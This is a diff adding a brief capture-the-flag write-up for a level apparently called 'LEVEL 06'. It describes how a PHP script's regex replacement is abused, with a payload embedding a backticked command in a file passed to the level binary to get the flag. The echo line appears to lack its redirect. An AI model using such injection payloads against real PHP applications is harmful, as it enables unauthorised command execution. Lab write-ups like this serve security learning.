@@ -1,0 +1,5 @@
+##LEVEL 06
+
+We can see that the `.php` file executes a regex. That regex is replacing some characters, so we need to create a file that contains those characters in way to be executable.
+
+`echo [x ${`getflag`}] /tmp/file06` then `./level06 /tmp/file06` and we get the flag.
